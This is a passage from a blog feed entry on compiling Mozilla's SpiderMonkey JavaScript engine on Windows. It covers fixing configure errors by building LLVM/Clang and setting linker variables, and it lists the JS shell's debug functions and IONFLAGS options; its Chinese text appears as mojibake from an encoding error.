&quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/util.configure&quot;, line 246, in try_invoke_compiler</span><br><span class="line">    return check_cmd_output(*cmd, **kwargs)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/util.configure&quot;, line 69, in check_cmd_output</span><br><span class="line">    retcode, stdout, stderr = get_cmd_output(*args, **kwargs)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/util.configure&quot;, line 46, in get_cmd_output</span><br><span class="line">    log.debug(&apos;Executing: `%s`&apos;, quote(*args))</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\shellutil.py&quot;, line 206, in quote</span><br><span class="line">    return &apos; &apos;.join(_quote(s) for s in strings)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\shellutil.py&quot;, line 206, in &lt;genexpr&gt;</span><br><span class="line">    return &apos; &apos;.join(_quote(s) for s in strings)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\shellutil.py&quot;, line 194, in _quote</span><br><span class="line">    return t(&quot;&apos;%s&apos;&quot;) % s.replace(t(&quot;&apos;&quot;), t(&quot;&apos;\\&apos;&apos;&quot;))</span><br><span class="line">TypeError: cannot create &apos;NoneType&apos; instances</span><br></pre></td></tr></table></figure><p>æ²¡åŠæ³•ï¼Œåªèƒ½è‡ªå·±ç¼–è¯‘ä¸€ä¸ª LLVM ï¼ˆå‚è€ƒ <a href="https://clang.llvm.org/get_started.html" target="_blank" rel="noopener">Building and Running Clang</a> ï¼Œè®°å¾—å…ˆå®‰è£… CMake ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone --depth 1 https://github.com/llvm/llvm-project.git</span><br><span class="line">cd llvm-project</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DLLVM_ENABLE_PROJECTS=clang -G "Visual Studio 15 2017" -A x64 -Thost=x64 ../llvm</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨ Visual Studio 2017 æ‰“å¼€ <code>LLVM.sln</code> ç¼–è¯‘ Release ç‰ˆæœ¬ã€‚</p><blockquote><p>Build the â€œclangâ€ project for just the compiler driver and front end, or the â€œALL_BUILDâ€ project to build everything, including tools.</p></blockquote><p>ç°åœ¨ï¼Œå¯ä»¥å›åˆ°ç¼–è¯‘ SpiderMonkey çš„æ­¥éª¤äº†ï¼Œå¼€å§‹ä¸‹ä¸€æ­¥ä¹‹å‰ï¼Œå…ˆæŠŠ LLVM çš„è·¯å¾„æ·»åŠ åˆ° <code>PATH</code> ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LLVMDIR=/D/llvm-project/build/Release</span><br><span class="line">export PATH=$PATH:$LLVMDIR/bin</span><br></pre></td></tr></table></figure><p>ç»§ç»­é…ç½®ç¼–è¯‘ SpiderMonkey ç›¸å…³çš„å‚æ•°ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --host=x86_64-pc-mingw32 --target=x86_64-pc-mingw32 --<span class="built_in">enable</span>-debug</span><br></pre></td></tr></table></figure><p>æç¤ºæ‰¾ä¸åˆ°é“¾æ¥å™¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">checking <span class="keyword">for</span> mt... C:/PROGRA~2/WI3CF2~1/10/bin/100177~1.0/x64/mt.exe</span><br><span class="line">checking whether MT is really Microsoft Manifest Tool... yes</span><br><span class="line">checking <span class="keyword">for</span> linker... not found</span><br><span class="line">DEBUG: linker: Trying lld-link</span><br><span class="line">ERROR: Cannot find linker</span><br></pre></td></tr></table></figure><p>é€šè¿‡è®¾ç½® <code>LINKER</code> ç¯å¢ƒå˜é‡è§£å†³ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LINKER=<span class="string">"/C/Program Files (x86)/Microsoft Visual Studio/2017/Professional/VC/Tools/MSVC/14.15.26726/bin/Hostx64/x64/link.exe"</span></span><br></pre></td></tr></table></figure><p>ç»§ç»­è¿è¡Œ <code>configure</code> ï¼Œä¼šæç¤ºæ‰¾ä¸åˆ° <code>host_linker</code> ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checking <span class="keyword">for</span> linker... c:/PROGRA~2/MICROS~3/2017/PROFES~1/VC/Tools/MSVC/1415~1.267/bin/Hostx64/x64/link.exe</span><br><span class="line">checking <span class="keyword">for</span> host_linker... not found</span><br><span class="line">DEBUG: host_linker: Trying lld-link</span><br><span class="line">ERROR: Cannot find host_linker</span><br></pre></td></tr></table></figure><p>é€šè¿‡è®¾ç½® <code>HOST_LINKER</code> ç¯å¢ƒå˜é‡è§£å†³ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HOST_LINKER=<span class="variable">$LINKER</span></span><br></pre></td></tr></table></figure><p>ä¸€åˆ‡æ­£å¸¸ï¼Œç»ˆäºå¯ä»¥å¼€å§‹ç¼–è¯‘äº†ï¼ˆä¸ºäº†åŠ å¿«ç¼–è¯‘é€Ÿåº¦ï¼Œå¯ä»¥æŒ‡å®š <code>-j</code> å‚æ•°ï¼‰ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mozmake -j4</span><br></pre></td></tr></table></figure><h2 id="0x03-JavaScript-Shell"><a href="#0x03-JavaScript-Shell" class="headerlink" title="0x03. JavaScript Shell"></a>0x03. JavaScript Shell</h2><p>ç­‰ SpiderMonkey ç¼–è¯‘å®Œä¹‹åï¼Œåœ¨è·¯å¾„ <code>build.asserts\dist\bin</code> ä¸‹å¯ä»¥æ‰¾åˆ°ç›¸å…³çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå…¶ä¸­ JavaScript Shell ä¸º <code>js.exe</code> ã€‚</p><p>å¦‚æœä¸æƒ³æŠ˜è…¾ç¼–è¯‘ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä» <a href="https://archive.mozilla.org/pub/firefox/nightly/latest-mozilla-central/" target="_blank" rel="noopener">Firefox Nightly Builds</a> ç›´æ¥ä¸‹è½½å·²ç»ç¼–è¯‘å¥½çš„ JavaScript Shell ï¼ˆè¿™æ˜¯ Release ç‰ˆæœ¬ï¼ŒåŠŸèƒ½æ¯” Debug ç‰ˆæœ¬å°‘ä¸€äº›ï¼‰ã€‚</p><h3 id="3-1-SpiderMonkey"><a href="#3-1-SpiderMonkey" class="headerlink" title="3.1 SpiderMonkey"></a>3.1 SpiderMonkey</h3><p><code>js.exe</code> æ”¯æŒå‚æ•°å¯åŠ¨ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ <code>js.exe --help</code> ã€‚</p><p><a href="https://programlife.net/tags/JavaScript/">JavaScript</a> Shell æä¾›äº†è®¸å¤šçš„å†…ç½®å‡½æ•°å¯ä¾›è°ƒç”¨ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ <code>help()</code> çš„æ‰§è¡Œç»“æœï¼ˆ Debug ç‰ˆæœ¬æ¯” Release æä¾›äº†æ›´å¤šçš„å†…ç½®å‡½æ•°ï¼‰ï¼›å‡ ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„å‡½æ•°ï¼š</p><ol><li>objectAddress ï¼Œæ‰“å° JavaScript å¯¹è±¡çš„å†…å­˜åœ°å€</li><li>dumpObject ï¼Œæ‰“å° JavaScript å¯¹è±¡çš„ç»“æ„</li><li>dis ï¼Œæ‰“å°å‡½æ•°çš„å­—èŠ‚ç </li><li>quit ï¼Œé€€å‡º JavaScript Shell</li></ol><p><img src="/uploads/201905/spidermonkey-javascript-shell.png" alt="SpiderMonkey JavaScript Shell"></p><h3 id="3-2-IonMonkey"><a href="#3-2-IonMonkey" class="headerlink" title="3.2 IonMonkey"></a>3.2 IonMonkey</h3><p><a href="https://programlife.net/tags/SpiderMonkey/">SpiderMonkey</a> çš„ JavaScript Shell åŒæ—¶æ”¯æŒè®¾ç½®å…¶ JIT ç¼–è¯‘å¼•æ“ <a href="https://programlife.net/tags/IonMonkey/">IonMonkey</a> çš„ç›¸å…³å‚æ•°ï¼Œå¯ä»¥å°†ç¯å¢ƒå˜é‡ <code>IONFLAGS</code> è®¾ç½®ä¸º <code>help</code> æ¥æŸ¥çœ‹è¯¦ç»†çš„å¸®åŠ©ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">set IONFLAGS=help</span><br><span class="line"></span><br><span class="line">js.exe</span><br><span class="line">found tag: help</span><br><span class="line"></span><br><span class="line">usage: IONFLAGS=option,option,option,... where options can be:</span><br><span class="line"></span><br><span class="line">  aborts        Compilation abort messages</span><br><span class="line">  scripts       Compiled scripts</span><br><span class="line">  mir           MIR information</span><br><span class="line">  prune         Prune unused branches</span><br><span class="line">  escape        Escape analysis</span><br><span class="line">  alias         Alias analysis</span><br><span class="line">  alias-sum     Alias analysis: shows summaries for every block</span><br><span class="line">  gvn           Global Value Numbering</span><br><span class="line">  licm          Loop invariant code motion</span><br><span class="line">  flac          Fold linear arithmetic constants</span><br><span class="line">  eaa           Effective address analysis</span><br><span class="line">  sincos        Replace sin/cos by sincos</span><br><span class="line">  sink          Sink transformation</span><br><span class="line">  regalloc      Register allocation</span><br><span class="line">  inline        Inlining</span><br><span class="line">  snapshots     Snapshot information</span><br><span class="line">  codegen       Native code generation</span><br><span class="line">  bailouts      Bailouts</span><br><span class="line">  caches        Inline caches</span><br><span class="line">  osi           Invalidation</span><br><span class="line">  safepoints    Safepoints</span><br><span class="line">  pools         Literal Pools (ARM only for now)</span><br><span class="line">  cacheflush    Instruction Cache flushes (ARM only for now)</span><br><span class="line">  range         Range Analysis</span><br><span class="line">  logs          JSON visualization logging</span><br><span class="line">  logs-sync     Same as logs, but flushes between each pass (sync. compiled functions only).</span><br><span class="line">  profiling     Profiling-related information</span><br><span class="line">  trackopts     Optimization tracking information gathered by the Gecko profiler. (Note: call enableGeckoProfiling() in your script to enable it).</span><br><span class="line">  trackopts-ext Encoding information about optimization tracking</span><br><span class="line">  dump-mir-expr Dump the MIR expressions</span><br><span class="line">  cfg           Control flow graph generation</span><br><span class="line">  all           Everything</span><br><span class="line"></span><br><span class="line">  bl-aborts     Baseline compiler abort messages</span><br><span class="line">  bl-scripts    Baseline script-compilation</span><br><span class="line">  bl-op         Baseline compiler detailed op-specific messages</span><br><span class="line">  bl-ic         Baseline inline-cache messages</span><br><span class="line">  bl-ic-fb      Baseline IC fallback stub messages</span><br><span class="line">  bl-osr        Baseline IC OSR messages</span><br><span class="line">  bl-bails      Baseline bailouts</span><br><span class="line">  bl-dbg-osr    Baseline debug mode on stack recompile messages</span><br><span class="line">  bl-all        All baseline spew</span><br><span class="line"></span><br><span class="line">See also SPEW=help for information on the Structured Spewer.</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-Why&quot;&gt;&lt;a href=&quot;#0x01-Why&quot; class=&quot;headerlink&quot; title=&quot;0x01. Why&quot;&gt;&lt;/a&gt;0x01. Why&lt;/h2&gt;&lt;p&gt;é“è·¯åƒä¸‡æ¡ï¼Œç¼–è¯‘ç¬¬ä¸€æ¡ï¼&lt;/p&gt;
&lt;p&gt;åœ¨ Windows ä¸Šç¼–è¯‘å¼€æºè½¯ä»¶ï¼Œæ€»æ˜¯æœ‰å„ç§å„æ ·çš„å‘ç­‰ç€å»å¡«ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://programlife.net/categories/JavaScript/"/>
    
      <category term="SpiderMonkey" scheme="http://programlife.net/categories/JavaScript/SpiderMonkey/"/>
    
    
      <category term="Firefox" scheme="http://programlife.net/tags/Firefox/"/>
    
      <category term="JavaScript" scheme="http://programlife.net/tags/JavaScript/"/>
    
      <category term="SpiderMonkey" scheme="http://programlife.net/tags/SpiderMonkey/"/>
    
      <category term="IonMonkey" scheme="http://programlife.net/tags/IonMonkey/"/>
    
  </entry>
  
</feed>
